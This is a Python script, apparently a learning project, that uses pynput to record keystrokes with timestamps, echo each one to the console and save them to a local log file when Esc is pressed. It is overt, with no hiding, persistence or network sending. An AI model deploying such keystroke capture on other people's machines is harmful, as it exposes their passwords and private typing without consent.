from datetime import datetime
from pynput import keyboard

class KeyLogger:
    def __init__(self):
        self.log = []
        self.start_time = None
        self.end_time = None
        self.file_name = None
        self.pressed_keys = set()

    def create_filename(self):
        self.start_time = datetime.now()
        self.file_name = f"log_{self.start_time.strftime('%Y%m%d_%H%M%S')}.txt"

    def keywrite(self, key_event, event_type):
        current_time = datetime.now().strftime('%d.%m.%Y %H:%M:%S')
        key_name = (
            f"'{key_event.char}'" if hasattr(key_event, 'char') and key_event.char else str(key_event)
        )
        self.log.append(f"{current_time} {event_type} {key_name}")
        print(self.log[-1])

    def on_press(self, key):
        if key not in self.pressed_keys:
            self.pressed_keys.add(key)
            self.keywrite(key, 'down')

    def on_release(self, key):
        if key in self.pressed_keys:
            self.pressed_keys.remove(key)
            self.keywrite(key, 'release')

        if key == keyboard.Key.esc:
            return False

    def report(self):
        self.end_time = datetime.now()
        with open(self.file_name, 'w') as log_file:
            log_file.write(f"Program start at {self.start_time.strftime('%d.%m.%Y %H:%M:%S')}\n")
            log_file.write("\n".join(self.log) + "\n")
            log_file.write(f"Program stop at {self.end_time.strftime('%d.%m.%Y %H:%M:%S')}\n")

    def keylogger_start(self):
        self.create_filename()
        print(f"Keylogger started. Logging to {self.file_name}. Press 'Esc' to stop.")
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
        self.report()
        print(f"Keylogger stopped. Log saved to {self.file_name}.")

if __name__ == "__main__":
    logger = KeyLogger()
    logger.keylogger_start()
